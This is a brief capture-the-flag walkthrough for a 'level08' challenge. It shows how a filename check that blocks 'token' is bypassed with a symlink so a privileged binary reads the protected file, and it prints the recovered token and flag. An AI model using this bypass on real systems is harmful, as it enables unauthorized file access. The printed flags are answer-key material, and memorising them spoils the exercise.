Here, we have 2 files called level08 and token

If we try to execute level08, we'll get:
./level08 [file to read]

So now if we try to execute it with token, we'll get:
You may not access 'token'

Let's see what is inside the level08 file with "strings level08"
we can see several important lines such as:
printf
strstr
$s [file to read]
token
You may not access '%s'

We can deduce that there is a check with strstr, token, and the file in argument
So, we need to create a SymLink and name not name it token:
ln -s ~/token /tmp/whatever

After that, we just have to execute level08 with this link:
./level08 /tmp/whatever

And it we give us the token: quif5eloekouj29ke0vouxean
We're not finished, because this token is use to do:
su flag08

Now, we can getflag and get the flag:
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
